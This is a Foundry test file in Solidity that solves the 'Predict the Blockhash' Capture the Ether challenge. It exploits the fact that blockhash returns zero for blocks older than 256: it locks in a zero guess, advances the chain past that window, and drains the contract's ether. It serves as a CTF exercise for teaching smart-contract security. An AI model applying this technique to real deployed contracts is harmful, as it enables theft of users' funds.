// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.14;

import "forge-std/Test.sol";
import "../src/lotteries/PredictTheBlockhash.sol";
import "forge-std/console.sol";

// forge test --match-contract PredictTheBlockhashTest -vvvv
contract PredictTheBlockhashTest is Test {
    address player = address(100);

    function setUp() public {
        vm.deal(player, 5 ether);
    }

    function testPredictTheBlockhashHack() public {
        /****************
         * Factory setup *
         *************** */
        PredictTheBlockHashChallenge predictTheBlockhash = new PredictTheBlockHashChallenge{
                value: 1 ether
            }();
        vm.startPrank(player);
        address levelAddress = address(predictTheBlockhash);
        uint256 initialPlayerBalance = player.balance;
        assertEq(initialPlayerBalance, 5 ether);
        /****************
         *    Attack     *
         *************** */
        /*
         * block.blockhash(uint blockNumber) returns (bytes32): hash of the given block
         *blockhash does not work for blocks that are older than 256, it then returns a zero address
         * So we can set our hashValue to 0 and call lockInGuess
         * Then wait 258 blocks ( 1 block, + (256 + 1))
        */
        bytes32 hashValue = 0x0;
        predictTheBlockhash.lockInGuess{value: 1 ether}(hashValue);
        vm.roll(block.number + 1+ 257);
        predictTheBlockhash.settle();


        uint256 finalPlayerBalance = player.balance;
        assertEq(finalPlayerBalance, 6 ether);
        /*****************
         *Level Submission*
         ***************  */
        bool levelSuccessfullyPassed = predictTheBlockhash.isComplete();
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}
